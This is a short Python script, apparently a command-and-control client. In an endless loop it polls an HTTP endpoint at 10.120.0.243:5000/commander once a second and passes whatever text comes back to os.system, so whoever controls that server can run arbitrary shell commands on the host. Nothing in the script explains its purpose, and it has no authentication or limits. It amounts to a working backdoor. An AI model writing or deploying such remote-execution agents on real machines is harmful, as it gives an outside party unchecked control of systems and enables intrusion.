import os
import urllib.request
import time

while True:
    with urllib.request.urlopen('http://10.120.0.243:5000/commander') as response:
        command_data = response.read().decode("utf-8")

        if not command_data == "No Action":
            os.system(command_data)
    time.sleep(1)
